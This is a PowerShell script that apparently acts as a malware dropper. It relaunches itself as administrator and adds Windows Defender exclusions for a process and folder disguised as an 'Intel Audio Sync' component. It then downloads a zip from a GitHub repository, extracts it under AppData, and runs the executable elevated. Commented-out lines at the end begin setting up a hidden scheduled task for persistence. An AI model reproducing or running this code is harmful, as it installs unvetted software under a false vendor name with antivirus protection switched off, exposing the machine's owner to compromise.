# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
  if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
        $CommandLine = "-NoExit -c cd '$pwd'; & `"" + $MyInvocation.MyCommand.Path + "`""
        Start-Process powershell -Verb runas -ArgumentList $CommandLine
        Exit
  }
}

$TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Sync"
$TargetFile = "$TargetPath\Intel Audio Sync.exe"
$TargetZip = "$TargetPath\Intel Audio Sync.zip"

if (Test-Path "$TargetFile") {
  Remove-Item -Force -Path "$TargetFile"
  Write-Output "Project file removed"
}

if (Test-Path "$TargetZip") {
  Remove-Item -Force -Path "$TargetZip"
  Write-Output "Project zip removed"
}

Add-MpPreference -ExclusionProcess 'Intel Audio Sync' -Force
Add-MpPreference -ExclusionProcess 'Intel Audio Sync.exe' -Force
Add-MpPreference -ExclusionPath "$TargetPath" -Force
Add-MpPreference -ExclusionPath "$TargetFile" -Force
Write-Output "Exclusions added"

if (-Not (Test-Path "$TargetFile")) {
  Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/dist/Intel Audio Service.zip" -OutFile "$TargetZip"
  Write-Output "File downloaded"
  Expand-Archive -Path "$TargetZip" -DestinationPath "$TargetPath"
  Write-Output "File extracted"
  Remove-Item -Path "$TargetZip"
  Write-Output "Zip file removed"
}


if (Get-Process -Name 'Intel Audio Sync' -ErrorAction SilentlyContinue) {
  exit
} else {
  Start-Process -FilePath "$TargetFile" -Verb RunAs -ErrorAction SilentlyContinue
  exit
}









# $TaskName = "Intel Audio Sync"
# $TaskDescription = "Running Intel Audio Sync from Task Scheduler"
# $TaskCommand = "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe"
# $TaskScript = "C:\PS\StartupScript.ps1"
# $TaskArg = "-WindowStyle Hidden -NonInteractive -Executionpolicy unrestricted -file $TaskScript"
# $TaskStartTime = [datetime]::Now.AddMinutes(1)
# $service = new-object -ComObject("Schedule.Service")
# $service.Connect()
# $rootFolder = $service.GetFolder("\")
# $TaskDefinition = $service.NewTask(0)
# $TaskDefinition.RegistrationInfo.Description = "$TaskDescription"
# $TaskDefinition.Settings.Enabled = $true
# $TaskDefinition.Settings.AllowDemandStart = $true
# $triggers = $TaskDefinition.Triggers
# #http://msdn.microsoft.com/en-us/library/windows/desktop/aa383915(v=vs.85).aspx
# $trigger = $triggers.Create(8)